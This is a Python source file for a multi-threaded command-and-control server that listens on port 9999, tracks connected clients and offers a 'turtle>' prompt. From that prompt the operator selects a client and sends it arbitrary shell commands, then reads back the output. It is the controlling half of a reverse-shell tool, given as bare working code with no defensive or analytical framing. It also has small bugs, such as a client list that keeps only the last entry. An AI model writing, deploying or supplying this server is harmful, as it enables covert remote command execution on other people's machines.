import socket
import threading
from queue import Queue


# Define the number of threads
NUMBER_OF_THREADS = 2


# The first thread job will be to listen for connections and accept connections
# The second thread job will be to send commands to an already connected client
JOB_NUMBER = [1, 2]


# Define a queue where the threads can receive the next job from
queue = Queue()

# Define a list to contain all the connections to the current clients
all_connections = []

# Define a list to contain all the addresses to the current clients
all_addresses = []


def create_socket():
    """
    Function that create a socket object
    """
    try:
        global host
        global port
        global s

        host = ''
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print(f'Socket creation error: {str(msg)}')


def bind_socket():
    """
    Function that binds the socket and listens for connections
    """
    try:
        global host
        global port
        global s

        print(f"Binding the port {str(port)} to the socket")

        # bind the port and host to our socket
        s.bind((host, port))

        # the server listens to up to 5 connections.
        s.listen(5)

    except socket.error as msg:
        print(f'Socket binding error: {str(msg)} \n Retrying..')
        bind_socket()


def accepting_connections():
    """
    Handling connection from multiple clients and save their data to a list.
    Closing previous connections when server.py file is restarted
    """
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()

            # Prevents connection timeout
            s.setblocking(1)

            all_connections.append(conn)
            all_addresses.append(address)

            print(f"Connection has been established! | IP: {address[0]} | Port {str(address[1])}")

        except:
            print('Error accepting connections')


def start_turtle():
    """
    This function initiate the interactive prompt.
    Allows us to view all clients.
    Select a client to sends command to.
    """
    while True:
        cmd = input('turtle> ')

        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print('This command is not recognized')


def list_connections():
    """
    Display all current active connections with the server
    """
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))  # send dummy connection to our client
            conn.recv(201480)
        except:                         # Remove useless connections from our data
            del all_connections[i]
            del all_addresses[i]
            continue

        results = f'{str(i)}    {str(all_addresses[i][0])}    {str(all_addresses[i][1])}\n'

    print(f'----Clients----\n{results}')


def get_target(cmd):
    """
    Get the selected client
    :param cmd: would be a string from the following format - select [client id]
    :return: The target's connection object
    """
    try:
        target = cmd.replace('select ', '')  # target = client id
        client_id = int(target)
        conn = all_connections[client_id]
        print(all_addresses)
        print(f'Connection has been established to : {str(all_addresses[client_id][0])}')
        # differentiate if we are in the interactive shell or the client shell
        # turtle>  (for the interactive shell
        # vs
        # 192.168.0.4>  (for the client shell)
        print(all_addresses[client_id][0] + '>', end="")
        return conn

    except:
        print("Selection is not valid")


def send_target_commands(conn):
    """
    Send commands to the selected client's pc
    :param conn: the target's connection object
    """
    while True:
        cmd = input()
        try:
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                # receive information back from the client in chunks of 1024 bytes (buffer size), utf-8 is the encoding type
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")

        except:
            print("Error sending commands")


def create_workers():
    """
    Creates worker threads
    """
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True  # So that the thread ends when the program is terminated
        t.start()


def work():
    """
    This function executes the next job in the queue [handle_connections, send_commands]
    """
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
